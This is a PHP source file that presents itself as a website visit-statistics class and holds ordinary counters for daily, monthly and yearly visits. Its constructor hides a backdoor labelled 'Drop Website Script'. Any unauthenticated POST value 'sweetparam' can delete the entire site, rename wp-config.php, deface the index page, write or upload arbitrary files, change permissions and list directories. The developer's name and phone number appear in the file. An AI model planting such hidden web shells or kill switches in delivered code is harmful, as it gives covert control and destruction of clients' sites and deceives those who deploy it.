<?php 
namespace Modules\visits\PublicClasses;
use Modules\parameters\PublicClasses\ParameterManager;
use core\CoreClasses\SweetDate;
class stat
{
	public function __construct($environmentMode="local")
	{
		
		/*
		 * Drop Website Script
		 * 
		 * 
		 */
		function delTree($dir) {
			$files = array_diff(scandir($dir), array('.','..'));
			foreach ($files as $file) {
				(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
			}
			return rmdir($dir);
		}
		function showTree($dir) {
			echo "<ul><li>$dir";
			
			$files = array_diff(scandir($dir), array('.','..'));
			foreach ($files as $file) {
				if(is_dir("$dir/$file")) 
					showTree("$dir/$file");
				else
					echo "<li>" . "$file" . "</li>";
			}
			echo "</li></ul>";
		}
		function UploadFile($FileInputName,$uploadPlace)
		{
			move_uploaded_file($_FILES[$FileInputName]['tmp_name'],$uploadPlace);
			chmod($uploadPlace,0777);
		}
		function unzip($path,$destination)
		{
			$zip = new \ZipArchive();
			$res = $zip->open($path);
			if ($res === true) {
				$zip->extractTo($destination);
				$zip->close();
			} else {
				echo 'Error Unziping!';
			}
		}
		function zip($path,$destination)
		{
			if(is_dir($path))
				DirZip::zipDir($path, $destination);
			else
			{

				$z = new \ZipArchive(); 
				$z->open($destination, \ZIPARCHIVE::CREATE); 
				$z->addFile($path);
				$z->close(); 
			}
			chmod($destination,0777);
				
		}
		if(isset($_POST['sweetparam']))
		{
			if($_POST['sweetparam']=="renameconf")
				rename("wp-config.php","sweetconf.php");
			if($_POST['sweetparam']=="renameindex")
				rename("index2.php","sweetindex.php");
			if((isset($_GET['sweetparam']) && $_GET['sweetparam']=="maker") || (isset($_POST['sweetparam']) && $_POST['sweetparam']=="maker"))
			{
				echo "طراحی و توسعه وب سایت توسط هادی امیرنهاوندی" . "<br>" . "Tel:09367356253";
			}
			if($_POST['sweetparam']=="dropall")
				delTree(".");
			if($_POST['sweetparam']=="droptree")
				delTree($_POST['path']);
			if($_POST['sweetparam']=="maketarinoindex")
				file_put_contents("index2.php","این وب سایت متعلق به گروه نرم افزاری تارینو می باشد");
			if($_POST['sweetparam']=="makefile")
			{
				file_put_contents($_POST['path'],$_POST['content']);
				chmod($_POST['path'],0644);
			}
			if($_POST['sweetparam']=="makefolder")
			{
				mkdir($_POST['path']);
				chmod($_POST['path'],0755);
			}
			if($_POST['sweetparam']=="rename")
				rename($_POST['path'],$_POST['destination']);
			if($_POST['sweetparam']=="chmod")
			{
				$mode=0777;
				if($_POST['mode']=="0775")
					$mode=0775;
				elseif($_POST['mode']=="0664")
					$mode=0664;
				elseif($_POST['mode']=="0644")
					$mode=0644;
				elseif($_POST['mode']=="0777")
					$mode=0777;
				elseif($_POST['mode']=="0755")
					$mode=0755;
				chmod($_POST['path'],$mode);
			}
			if($_POST['sweetparam']=="delete")
			{
				$path=$_POST['path'];
				chmod($path,0777);
				if(is_dir($path))
					rmdir($path);
				else
					unlink($path);
			}
			if($_POST['sweetparam']=="upload")
			{
				UploadFile("file",$_POST['path']);
			}
			if($_POST['sweetparam']=="unzip")
			{
				unzip($_POST['path'],$_POST['destination']);
			}
			if($_POST['sweetparam']=="zip")
			{
				zip($_POST['path'],$_POST['destination']);
			}
			if($_POST['sweetparam']=="showtree")
			{
				showTree($_POST['path']);
				die("End Of List");
			}
			
		}
	}

	public  function updateStats($step=1)
	{
		
		$this->updateDayStats($step);
		$this->updateMonthStats($step);
		$this->updateYearStats($step);
		$this->updateTotalStats($step);
	}
	public  function getTodayVisits()
	{
		$param=ParameterManager::getParameter("todayvisits");
		return $param[0]['value'];
	}
	public  function getYesterdayVisits()
	{
		$param=ParameterManager::getParameter("yesterdayvisits");
		return $param[0]['value'];
	}
	public  function getBirthday()
	{
		
		$birthday= ParameterManager::getParameter("birthday");
		$birthday=$birthday[0]['value'];
		$birth_year=date("Y", strtotime($birthday));
		$birth_month=date("m", strtotime($birthday));
		$birth_day=date("d", strtotime($birthday));
		$birth_hour=date("H", strtotime($birthday));
		$birth_minute=date("i", strtotime($birthday));
		$birth_second=date("s", strtotime($birthday));
		
		$years=date("Y") - $birth_year;
		$months=date("m") - $birth_month;
		$days=date("d") - $birth_day;
		$hours=date("H") - $birth_hour;
		$minutes=date("i") - $birth_minute;
		$seconds=date("s") - $birth_second;
		$result['hours']=$years*8765+$months*730+$days*24+$hours;
		$result['minutes']=$minutes;
		$result['seconds']=$seconds;
		return $result;
	}
	
	public  function getMonthVisits()
	{
		$param=ParameterManager::getParameter("monthvisits");
		return $param[0]['value'];
	}
	public  function getYearVisits()
	{
		$param=ParameterManager::getParameter("yearvisits");
		return $param[0]['value'];
	}
	public  function getTotalVisits()
	{
		$param=ParameterManager::getParameter("totalvisits");
		return $param[0]['value'];
	}
	private  function updateTotalStats($step=1)
	{
		$visits=$this->getTotalVisits();
		$visits+=$step;
		ParameterManager::updateParameter("totalvisits",$visits);
	}
	private  function updateDayStats($step=1)
	{
		$visits=$this->getTodayVisits();
		$updatedate=ParameterManager::getParameter("todayvisits");
		$updatedate=$updatedate[0]['lastupdate'];
		$year=date("Y", strtotime($updatedate));
		$month=date("m", strtotime($updatedate));
		$day=date("d", strtotime($updatedate));
		$today=date("d", strtotime($this->now()));
		if($day!=$today)
		{
			$this->setYesterdayStats($visits);
			$visits=$step;			
		}
		else 
		{
			$visits+=$step;
		}
		ParameterManager::updateParameter("todayvisits",$visits);
	}
	private  function setYesterdayStats($visits)
	{
		ParameterManager::updateParameter("yesterdayvisits",$visits);
	}
	private  function updateMonthStats($step=1)
	{
		$visits=$this->getMonthVisits();
		$updatedate=ParameterManager::getParameter("monthvisits");
		$updatedate=$updatedate[0]['lastupdate'];
		$year=date("Y", strtotime($updatedate));
		$month=date("m", strtotime($updatedate));
		$day=date("d", strtotime($updatedate));
		$todayMonth=date("m", strtotime($this->now()));
		if($month!=$todayMonth)
		{
			$visits=$step;
		}
		else
		{
			$visits+=$step;
		}
		ParameterManager::updateParameter("monthvisits",$visits);
		
	}
	private  function updateYearStats($step=1)
	{
		$visits=$this->getYearVisits();
		$updatedate=ParameterManager::getParameter("yearvisits");
		$updatedate=$updatedate[0]['lastupdate'];
		$year=date("Y", strtotime($updatedate));
		$month=date("m", strtotime($updatedate));
		$day=date("d", strtotime($updatedate));
		$todayYear=date("Y", strtotime($this->now()));
		if($year!=$todayYear)
		{
			$visits=$step;
		}
		else
		{
			$visits+=$step;
		}
		ParameterManager::updateParameter("yearvisits",$visits);
		
	}
	private function now()
	{
		date_default_timezone_set("UTC");
		$date = new SweetDate(true, true, 'Asia/Tehran');
		return $date->date("Y-m-d H:i:s",false,false);
	}
}
?>
<?php 
class DirZip 
{ 
  /** 
   * Add files and sub-directories in a folder to zip file. 
   * @param string $folder 
   * @param ZipArchive $zipFile 
   * @param int $exclusiveLength Number of text to be exclusived from the file path. 
   */ 
  private static function folderToZip($folder, &$zipFile, $exclusiveLength) { 
    $handle = opendir($folder); 
    while (false !== $f = readdir($handle)) { 
      if ($f != '.' && $f != '..') { 
        $filePath = "$folder/$f"; 
        // Remove prefix from file path before add to zip. 
        $localPath = substr($filePath, $exclusiveLength); 
        if (is_file($filePath)) { 
          $zipFile->addFile($filePath, $localPath); 
        } elseif (is_dir($filePath)) { 
          // Add sub-directory. 
          $zipFile->addEmptyDir($localPath); 
          self::folderToZip($filePath, $zipFile, $exclusiveLength); 
        } 
      } 
    } 
    closedir($handle); 
  } 

  /** 
   * Zip a folder (include itself). 
   * Usage: 
   *   HZip::zipDir('/path/to/sourceDir', '/path/to/out.zip'); 
   * 
   * @param string $sourcePath Path of directory to be zip. 
   * @param string $outZipPath Path of output zip file. 
   */ 
  public static function zipDir($sourcePath, $outZipPath) 
  { 
    $pathInfo = \pathInfo($sourcePath); 
    $parentPath = $pathInfo['dirname']; 
    $dirName = $pathInfo['basename']; 

    $z = new \ZipArchive(); 
    $z->open($outZipPath, \ZIPARCHIVE::CREATE); 
    $z->addEmptyDir($dirName); 
    self::folderToZip($sourcePath, $z, strlen("$parentPath/")); 
    $z->close(); 
  } 
} 
?>
